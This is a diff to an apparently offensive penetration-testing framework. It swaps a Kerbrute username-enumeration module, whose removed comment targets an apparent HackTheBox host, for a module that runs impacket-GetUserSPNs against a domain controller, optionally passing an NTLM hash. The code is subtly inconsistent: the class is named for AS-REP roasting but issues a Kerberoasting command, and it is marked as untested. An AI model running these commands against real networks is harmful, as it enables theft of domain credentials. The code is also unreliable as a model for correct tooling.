@@ -1,21 +1,28 @@
 from .UserEnumModuleBase import UserEnumModuleBase
 from ...logger import logger
-from ...utils import is_ip
+from ...utils import is_ip, is_ntlm_hash
 
-class Kerbrute(UserEnumModuleBase):
+class ASPrepRoastable(UserEnumModuleBase):
     """Class to run NetExec against a single host"""
 
     def run(self):
         if not is_ip(self.target):
-            raise ValueError("Target should be an IP: %s", self.target)
-        
-        logfile = self.get_log_name("log")
-        cmdfile =  self.get_log_name("cmd")
+            raise ValueError("Target should be an IP: %s", self.target)      
 
         domain = self.args["domain"]
-        w = self.args["wordlist"]
+        user = self.args["user"]
+
+        self.args["pmode"] = "pw" # For the filename
+        logfile = self.get_log_name("log")
+        cmdfile =  self.get_log_name("cmd")
+        if is_ntlm_hash(self.args["password"]):
+            hashes = "-hashes " + "0"*32 + ":" + self.args["password"]
+            self.command = f"impacket-GetUserSPNs -dc-ip {self.target} {domain}/{user} {hashes}"
+            self.args["pmode"] = "H" 
+        else:
+            passw = self.args["password"]
+            self.command = f"impacket-GetUserSPNs -dc-ip {self.target} {domain}/{user}:'{passw}'"
+
+        # TODO TEST / CHeck
         
-        # `kerbrute userenum -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.236`
-        self.command = f"kerbrute userenum -d {domain} {w} --dc {self.target} -o {logfile}"
-        # TODO Implement Kerbrute output parsing, and make it a realtime output
-        self.output = self.get_system_cmd_outptut(self.command, logcmdline=cmdfile)
+        self.output = self.get_system_cmd_outptut(self.command, logcmdline=cmdfile, logoutput=logfile)
